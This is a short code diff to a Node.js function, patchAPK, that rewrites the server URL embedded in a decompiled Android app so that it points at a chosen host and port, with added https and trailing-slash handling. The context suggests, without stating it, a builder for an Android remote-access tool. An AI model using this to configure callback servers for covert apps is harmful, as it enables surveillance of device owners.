@@ -28,7 +28,10 @@ function javaversion(callback) {
 function patchAPK(URI, PORT, cb) {
     fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
         if (err) return cb('File Patch Error - READ')
-        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
+        let finalURI = URI.startsWith('http') ? URI : (PORT == 443 ? 'https://' + URI : 'http://' + URI);
+        // Ensure we don't have trailing slashes
+        finalURI = finalURI.replace(/\/$/, '');
+        var result = data.replace(/const-string v3, "https?:\/\/[^?]+\?model="/, 'const-string v3, "' + finalURI + ':' + PORT + '?model="');
         fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
             if (err) return cb('File Patch Error - WRITE')
             else return cb(false)
